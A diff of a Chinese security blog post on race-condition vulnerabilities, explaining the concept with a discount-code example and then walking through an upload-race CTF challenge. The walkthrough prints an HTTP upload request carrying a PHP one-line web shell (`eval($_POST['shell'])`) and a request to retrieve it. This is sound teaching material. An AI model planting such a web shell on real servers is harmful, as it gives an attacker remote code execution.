@@ -1,31 +1,30 @@
+
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-default-color-scheme=auto>
+
+
+
 <head>
   <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/css/main.css">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/SecureNexusLab.png">
+  <link rel="icon" href="/img/SecureNexusLab.png">
+  
 
-
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"v4ethan.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
-
-  <meta name="description" content="Web安全条件竞争漏洞学习 0x00 概述 ​		条件竞争漏洞发生在多个线程同时访问同一个共享代码、变量、文件等，，由于多个不同线程同时与相同的数据进行交互，从而导致碰撞冲突（例如，后端多个线程同时修改数据库中的某一个字段值）。攻击者通过精心定制请求到达后端的时间故意制造冲突，并由此实现恶意目的。这个漏洞存在于操作系统、数据库、web等多个层面，由于大多服务端框架在处理不同用户的请求时是并发进行的">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="fishcanf1y">
+  <meta name="keywords" content="fishcanf1y">
+  
+    <meta name="description" content="Web安全条件竞争漏洞学习0x00 概述​        条件竞争漏洞发生在多个线程同时访问同一个共享代码、变量、文件等，，由于多个不同线程同时与相同的数据进行交互，从而导致碰撞冲突（例如，后端多个线程同时修改数据库中的某一个字段值）。攻击者通过精心定制请求到达后端的时间故意制造冲突，并由此实现恶意目的。这个漏洞存在于操作系统、数据库、web等多个层面，由于大多服务端框架在处理不同用户的请求时是并">
 <meta property="og:type" content="article">
 <meta property="og:title" content="条件竞争漏洞学习">
-<meta property="og:url" content="https://v4ethan.github.io/2025/02/08/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html">
-<meta property="og:site_name" content="V4Ethan">
-<meta property="og:description" content="Web安全条件竞争漏洞学习 0x00 概述 ​		条件竞争漏洞发生在多个线程同时访问同一个共享代码、变量、文件等，，由于多个不同线程同时与相同的数据进行交互，从而导致碰撞冲突（例如，后端多个线程同时修改数据库中的某一个字段值）。攻击者通过精心定制请求到达后端的时间故意制造冲突，并由此实现恶意目的。这个漏洞存在于操作系统、数据库、web等多个层面，由于大多服务端框架在处理不同用户的请求时是并发进行的">
+<meta property="og:url" content="https://fishcanf1y.github.io/2025/02/08/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="fishcanf1y">
+<meta property="og:description" content="Web安全条件竞争漏洞学习0x00 概述​        条件竞争漏洞发生在多个线程同时访问同一个共享代码、变量、文件等，，由于多个不同线程同时与相同的数据进行交互，从而导致碰撞冲突（例如，后端多个线程同时修改数据库中的某一个字段值）。攻击者通过精心定制请求到达后端的时间故意制造冲突，并由此实现恶意目的。这个漏洞存在于操作系统、数据库、web等多个层面，由于大多服务端框架在处理不同用户的请求时是并">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://pic2.zhimg.com/80/v2-ffffaa1fb957682cebb626a0482344b3_720w.webp">
 <meta property="og:image" content="https://pica.zhimg.com/80/v2-b3ccc0bc7165f6bd90fcf6769c591786_720w.webp">
@@ -33,471 +32,821 @@
 <meta property="og:image" content="https://pic2.zhimg.com/80/v2-98252be57cdc6ace37d120354c2b5da1_720w.webp">
 <meta property="article:published_time" content="2025-02-08T09:02:24.000Z">
 <meta property="article:modified_time" content="2025-06-27T12:27:51.612Z">
-<meta property="article:author" content="V4Ethan">
+<meta property="article:author" content="fishcanf1y">
 <meta property="article:tag" content="Web安全">
-<meta name="twitter:card" content="summary">
+<meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://pic2.zhimg.com/80/v2-ffffaa1fb957682cebb626a0482344b3_720w.webp">
+  
+  
+  
+  <title>条件竞争漏洞学习 - fishcanf1y</title>
 
-<link rel="canonical" href="https://v4ethan.github.io/2025/02/08/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
 
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : false,
-    isPost : true,
-    lang   : 'en'
-  };
-</script>
 
-  <title>条件竞争漏洞学习 | V4Ethan</title>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
   
 
 
 
+  
+<link rel="stylesheet" href="https://cdn.staticfile.org/lxgw-wenkai-screen-webfont/1.7.0/style.min.css">
 
 
 
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"fishcanf1y.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
 
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
 
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
 
+  
+  <script src="/js/sakura.js"></script>
+  <script src="/js/love.js"></script>
 <!-- hexo injector head_end start -->
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
 
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
-<!-- hexo injector head_end end --></head>
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
 
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
 
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
+<body>
+  
 
-  <div class="site-meta">
+  <header>
+    
 
-    <a href="/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">V4Ethan</h1>
-      <span class="logo-line-after"><i></i></span>
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>fishcanf1y&#39;s blog</strong>
     </a>
-  </div>
 
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
     </div>
   </div>
-</div>
-
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
-
-  </li>
-        <li class="menu-item menu-item-about">
-
-    <a href="/about/index.html" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/index.html" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
-
-  </li>
-  </ul>
 </nav>
 
+  
 
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background.PNG') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="条件竞争漏洞学习"></span>
+          
+        </div>
 
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-02-08 17:02" pubdate>
+          February 8, 2025 pm
+        </time>
+      </span>
+    
+  </div>
 
-</div>
-    </header>
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2k words
+        
+      </span>
+    
 
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          17 mins
+        
+      </span>
+    
+
+    
+    
   </div>
 
 
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content post posts-expand">
-            
-
-    
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://v4ethan.github.io/2025/02/08/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="V4Ethan">
-      <meta itemprop="description" content="V4Ethan's Blog">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="V4Ethan">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          条件竞争漏洞学习
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2025-02-08 17:02:24" itemprop="dateCreated datePublished" datetime="2025-02-08T17:02:24+08:00">2025-02-08</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2025-06-27 20:27:51" itemprop="dateModified" datetime="2025-06-27T20:27:51+08:00">2025-06-27</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+        
+      </div>
 
       
-        <h2 id="Web安全条件竞争漏洞学习">Web安全条件竞争漏洞学习</h2>
-<h4 id="0x00-概述">0x00 概述</h4>
-<p>​		条件竞争漏洞发生在多个线程同时访问同一个共享代码、变量、文件等，，由于多个不同线程同时与相同的数据进行交互，从而导致碰撞冲突（例如，后端多个线程同时修改数据库中的某一个字段值）。攻击者通过精心定制请求到达后端的时间故意制造冲突，并由此实现恶意目的。这个漏洞存在于操作系统、数据库、web等多个层面，由于大多服务端框架在处理不同用户的请求时是并发进行的，而开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。</p>
-<h6 id="简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作">简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作</h6>
-<span id="more"></span>
-<h4 id="0x01-简单分析">0x01 简单分析</h4>
-<p>我们来设计一个简答的业务逻辑：商城系统中，用户提交折扣码，后端会检测用户是否已经使用过折扣码。若未使用过，则使用该折扣码，并记录折扣码使用状态为True。若已使用折扣码，用户再次使用折扣码时，后端程序读取折扣码使用状态为True，拒绝用户再次使用折扣码。</p>
-<p><img src="https://pic2.zhimg.com/80/v2-ffffaa1fb957682cebb626a0482344b3_720w.webp" alt="Lesson-eb3846115f6b8"></p>
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">条件竞争漏洞学习</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="Web安全条件竞争漏洞学习"><a href="#Web安全条件竞争漏洞学习" class="headerlink" title="Web安全条件竞争漏洞学习"></a>Web安全条件竞争漏洞学习</h2><h4 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h4><p>​        条件竞争漏洞发生在多个线程同时访问同一个共享代码、变量、文件等，，由于多个不同线程同时与相同的数据进行交互，从而导致碰撞冲突（例如，后端多个线程同时修改数据库中的某一个字段值）。攻击者通过精心定制请求到达后端的时间故意制造冲突，并由此实现恶意目的。这个漏洞存在于操作系统、数据库、web等多个层面，由于大多服务端框架在处理不同用户的请求时是并发进行的，而开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。</p>
+<h6 id="简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作"><a href="#简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作" class="headerlink" title="简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作"></a>简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作</h6><span id="more"></span>
+<h4 id="0x01-简单分析"><a href="#0x01-简单分析" class="headerlink" title="0x01 简单分析"></a>0x01 简单分析</h4><p>我们来设计一个简答的业务逻辑：商城系统中，用户提交折扣码，后端会检测用户是否已经使用过折扣码。若未使用过，则使用该折扣码，并记录折扣码使用状态为True。若已使用折扣码，用户再次使用折扣码时，后端程序读取折扣码使用状态为True，拒绝用户再次使用折扣码。</p>
+<p><img src="https://pic2.zhimg.com/80/v2-ffffaa1fb957682cebb626a0482344b3_720w.webp" srcset="/img/loading.gif" lazyload alt="Lesson-eb3846115f6b8"></p>
 <p>我们在这里用一段简单的python代码来模拟后端逻辑，处理请求的<code>handle_req()</code>函数是并发（多线程/多进程）执行的：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> **handle_req**():</span><br><span class="line">    <span class="keyword">if</span> code_already_used = <span class="literal">False</span>: <span class="comment"># 判断如果没有使用过折扣码（实际应该是对数据库的查询，此处简化写法）</span></span><br><span class="line">        use_code()				  <span class="comment"># 使用折扣码，对商品进行打折</span></span><br><span class="line">        code_already_used = <span class="literal">True</span>  <span class="comment"># 使用过折扣码后，将折扣码使用状态为True（实际应该是对数据库的数据更新，此处简化写法）</span></span><br><span class="line">    <span class="keyword">else</span>:						  <span class="comment"># 若已经使用过折扣码</span></span><br><span class="line">        reject_use_code()      	  <span class="comment"># 拒绝再次使用折扣码</span></span><br></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">def</span> **handle_req**():
+    <span class="hljs-keyword">if</span> code_already_used = <span class="hljs-literal">False</span>: <span class="hljs-comment"># 判断如果没有使用过折扣码（实际应该是对数据库的查询，此处简化写法）</span>
+        use_code()				  <span class="hljs-comment"># 使用折扣码，对商品进行打折</span>
+        code_already_used = <span class="hljs-literal">True</span>  <span class="hljs-comment"># 使用过折扣码后，将折扣码使用状态为True（实际应该是对数据库的数据更新，此处简化写法）</span>
+    <span class="hljs-keyword">else</span>:						  <span class="hljs-comment"># 若已经使用过折扣码</span>
+        reject_use_code()      	  <span class="hljs-comment"># 拒绝再次使用折扣码</span></code></pre></div>
 <p>但是这个过程可能会存在条件竞争漏洞，因为我们第一次请求判断的状态为false即未使用折扣码，但是第一个请求执行到第四行时准备更新数据库内容而第二个请求又开始执行并将折扣码使用状态再一次地标记为false，从而造成了使用了两次折扣码，触发了条件竞争漏洞，如下图所示：后端将记录折扣码使用状态为True之前，可能存在条件竞争，上述第2、3行代码执行的时间就是<code>竞争窗口</code>。</p>
-<p><img src="https://pica.zhimg.com/80/v2-b3ccc0bc7165f6bd90fcf6769c591786_720w.webp" alt="Lesson-eb3846115f6b8"></p>
-<p>竞争窗口一般是一段很短的时间段（几毫秒甚至更短），用户通过并行发送多个数据包，使得服务端竞争窗口内执行多次特定的功能。</p>
-<p><img src="https://pic4.zhimg.com/80/v2-936e0bec041297e3b7f8b1f0d9f568d1_720w.webp" alt="Lesson-eb3846115f6b8"></p>
-<h4 id="0x02-CTF中的条件竞争">0x02 CTF中的条件竞争</h4>
-<p>我们来看这样的一道题目</p>
-<p>【题型】<a href>Web</a><br>
-【题目】<code>wzsc_文件上传</code><br>
-【来源】（[攻防世界](<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list%EF%BC%89">https://adworld.xctf.org.cn/challenges/list）</a><br>
-【思路】<a href>条件竞争</a></p>
+<p><img src="https://pica.zhimg.com/80/v2-b3ccc0bc7165f6bd90fcf6769c591786_720w.webp" srcset="/img/loading.gif" lazyload alt="Lesson-eb3846115f6b8"></p>
+<p>　竞争窗口一般是一段很短的时间段（几毫秒甚至更短），用户通过并行发送多个数据包，使得服务端竞争窗口内执行多次特定的功能。</p>
+<p><img src="https://pic4.zhimg.com/80/v2-936e0bec041297e3b7f8b1f0d9f568d1_720w.webp" srcset="/img/loading.gif" lazyload alt="Lesson-eb3846115f6b8"></p>
+<h4 id="0x02-CTF中的条件竞争"><a href="#0x02-CTF中的条件竞争" class="headerlink" title="0x02 CTF中的条件竞争"></a>0x02 CTF中的条件竞争</h4><p>我们来看这样的一道题目</p>
+<p>【题型】<a href>Web</a><br>【题目】<code>wzsc_文件上传</code><br>【来源】（<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list）
+【思路】[条件竞争](">攻防世界</a></p>
 <p>我们先上传一个一句话木马并把包拦截下来进行分析测试</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">Host: Host:Port</span><br><span class="line">Content-Length: 230</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://61.147.171.105:56903</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMwWBoiGSKcfAYxLh</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: Host:Port</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryMwWBoiGSKcfAYxLh</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;classic.php&quot;</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;shell&quot;</span>]); ?&gt;</span><br><span class="line">------WebKitFormBoundaryMwWBoiGSKcfAYxLh--</span><br></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs bash">POST /upload.php HTTP/1.1
+Host: Host:Port
+Content-Length: 230
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://61.147.171.105:56903
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMwWBoiGSKcfAYxLh
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: Host:Port
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+------WebKitFormBoundaryMwWBoiGSKcfAYxLh
+Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;classic.php&quot;</span>
+Content-Type: application/octet-stream
+
+&lt;?php @<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;shell&quot;</span>]); ?&gt;
+------WebKitFormBoundaryMwWBoiGSKcfAYxLh--</code></pre></div>
 <p>我们把它放到Repeater中放出去看看，查看返回包</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 08 Feb 2025 09:38:03 GMT</span><br><span class="line">Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line">Content-Length: 0</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs bash">HTTP/1.1 200 OK
+Date: Sat, 08 Feb 2025 09:38:03 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Content-Length: 0
+Connection: close
+Content-Type: text/html; charset=UTF-8</code></pre></div>
 <p>我们可以看到这里的状态码是200，证明我们是可以成功上传但是在服务器中被删除了，那这时候可以使用以下思路</p>
 <p>我们先尝试访问我们上传的一句话并拦截包</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /upload/classic.php HTTP/1.1</span><br><span class="line">Host: 61.147.171.105:56903</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs bash">GET /upload/classic.php HTTP/1.1
+Host: 61.147.171.105:56903
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close</code></pre></div>
